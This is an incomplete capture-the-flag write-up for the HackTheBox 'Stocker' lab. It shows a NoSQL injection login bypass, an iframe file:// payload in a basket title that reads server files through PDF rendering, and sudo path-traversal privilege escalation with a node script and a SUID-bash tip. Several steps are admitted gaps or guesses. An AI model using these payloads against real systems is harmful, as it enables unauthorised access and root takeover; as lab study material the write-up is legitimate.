# HackTheBox — Stocker

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Tags: nosqli, ssrf, sudo](https://img.shields.io/badge/Tags-NoSQLi%20%7C%20SSRF%20%7C%20sudo-orange)

> 🚧 **[incomplete — original notes are fragmentary; key payloads and creds preserved below but narrative is sparse]**

---

## Attack Chain at a Glance

```
nmap → web app on port 80 (Eleventy v2.0.0) → ??? subdomain enumeration
   → NoSQL injection on login → admin access as angoose
   → SSRF via iframe in basket title → read /var/www/dev/index.js
   → ??? → user.txt
   → sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/getRoot.js
     (path traversal in sudo rule lets us run arbitrary node scripts) → root.txt
```

> 🚧 **[gaps]** — narrative connecting nmap → NoSQLi, and how the iframe SSRF leads from `index.js` content to a user-flag-bearing shell.

---

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sSCV -p- --min-rate=5000 -oN nmap.txt <target>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
|_http-generator: Eleventy v2.0.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH     | OpenSSH 8.2p1 |
| 80   | HTTP    | nginx 1.18.0 — landing page is **Eleventy v2.0.0** static site |

> 🚧 **[gap]** — landing page is a static "Coming Soon" page. Subdomain enumeration is required to find the actual application; that step isn't in the notes but presumably surfaced `dev.stocker.htb`.

---

## Initial Foothold — NoSQL Injection

The application uses MongoDB. Reference: [HackTricks — NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection).

> 🚧 **[gap]** — the actual NoSQLi payload used (likely something like `{"username": {"$ne": null}, "password": {"$ne": null}}` against the login endpoint) isn't documented.

After login, the user lands as **`angoose`**.

---

## SSRF via Basket-Title iframe

Adding an item to the cart with an iframe payload as the title leaks server-side files:

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<iframe src=file:///var/www/dev/index.js height=1000px width=800px></iframe>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 1
    }
  ]
}
```

> 💡 The receipt/order PDF is rendered server-side (likely with a headless Chromium / `puppeteer` or `wkhtmltopdf`), and the title is reflected unsanitized — so an `<iframe src="file://...">` in the title pulls server-local content into the rendered PDF.

> 🚧 **[gap]** — what was extracted from `index.js` (presumably credentials for an SSH-able account, or session-cookie material), and how that pivoted to `user.txt`.

---

## User Flag

> 🚧 **[incomplete]**

---

## Privilege Escalation — Sudo + Path Traversal

`sudo -l` (output not preserved) showed `angoose` could run a node script as root, with the rule allowing path traversal:

```bash
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/getRoot.js
```

Because the sudo rule pattern doesn't normalize `..`, we can drop our own `getRoot.js` in `~angoose/` and have it run as root.

### Payload — read root flag

```javascript
const fs = require('fs');
fs.readFile('/root/root.txt', 'utf8', (err, data) => {
    if (err) throw err;
    console.log(data);
});
```

For a full root shell rather than just file read, swap the body for `child_process.execSync('chmod u+s /bin/bash')` and then `bash -p`.

---

## Root Flag

> 🚧 **[incomplete]** — the actual flag value was not preserved in the original notes.

---

## Lessons Learned

> 🚧 **[incomplete]** — to fill in once narrative is complete. Candidate themes:
> - Static-looking sites often have separate subdomain apps; always enumerate vhosts before assuming there's nothing there.
> - Server-side PDF renderers that accept HTML are routinely vulnerable to `<iframe src="file://...">` SSRF for local file read.
> - `sudo` rules with absolute-path-looking patterns are still vulnerable to `..` traversal unless the policy uses `sudo`'s built-in path canonicalization.

---

## Tools Referenced

| Tool | Purpose |
|------|---------|
| [`nmap`](https://nmap.org/) | Port and service discovery |
| [HackTricks — NoSQL Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection) | NoSQLi reference for the login bypass |
